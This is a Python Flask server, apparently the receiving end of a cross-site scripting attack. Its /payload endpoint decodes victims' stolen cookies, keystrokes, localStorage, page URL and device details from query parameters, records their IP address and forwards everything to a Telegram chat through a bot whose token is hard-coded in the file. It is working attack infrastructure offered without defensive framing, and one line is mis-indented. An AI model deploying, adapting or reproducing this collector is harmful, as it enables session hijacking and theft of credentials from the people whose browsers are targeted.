from flask import Flask, request, jsonify
import requests
import base64
import datetime
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)

# ====================== AYARLAR ======================
TELEGRAM_TOKEN = "8767985062:AAHWwP9ev6zOPr3_0oe7bdlpLUIA7cMPVRI"
TELEGRAM_CHAT_ID = "-1003987215301"

def safe_decode(b64_str):
    if not b64_str or b64_str in ["undefined", "null", ""]: return "Yok"
    try:
        b64_str += '=' * (-len(b64_str) % 4)
        return base64.urlsafe_b64decode(b64_str).decode('utf-8', errors='ignore')
    except:
        try:
            return base64.b64decode(b64_str).decode('utf-8', errors='ignore')
        except:
            return "Decode Hatası"

# BU KISIM ESKİSİNİN YERİNE GELECEK
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
        
        # Yanıtı yakalıyoruz ki Render loglarında görebilelim
        response = requests.post(url, json=data, timeout=15)
        
        # RENDER LOGLARINDA BU ÇIKTIYI KONTROL ET
        print(f"--- TELEGRAM DURUMU ---")
        print(f"Durum Kodu: {response.status_code}")
        print(f"Yanıt Metni: {response.text}")
        
    except Exception as e:
        print(f"Ciddi Hata: {e}")
# ====================== PAYLOAD ENDPOINT ======================
@app.route('/payload', methods=['GET'])
def payload_receiver():
    now = datetime.datetime.now().strftime("%H:%M:%S")
ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Verileri yakala
    url = safe_decode(request.args.get('u', ''))
    port = safe_decode(request.args.get('p', '')) # Tarayıcı portu eklendi
    cookies = safe_decode(request.args.get('c', ''))
    keys = safe_decode(request.args.get('k', ''))      
    storage = safe_decode(request.args.get('ls', ''))   
    ua = safe_decode(request.args.get('ua', ''))

    # Telegram Mesajı
    msg = (
        f"<b>🔥 HEDEF TETİKLENDİ!</b>\n\n"
        f"<b>🌐 IP:</b> <code>{ip}</code>\n"
        f"<b>📍 URL:</b> <code>{url}</code>\n"
        f"<b>🔌 Port:</b> <code>{port}</code>\n\n"
        f"<b>⌨️ Tuş Vuruşları:</b>\n<code>{keys if keys != 'Yok' else 'Yazı yok...'}</code>\n\n"
        f"<b>🍪 Cookies:</b>\n<code>{cookies[:800]}</code>\n\n"
        f"<b>📦 LocalStorage:</b>\n<code>{storage[:800]}</code>\n\n"
        f"<b>📱 Cihaz:</b> <code>{ua[:150]}</code>"
    )

    send_to_telegram(msg)
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
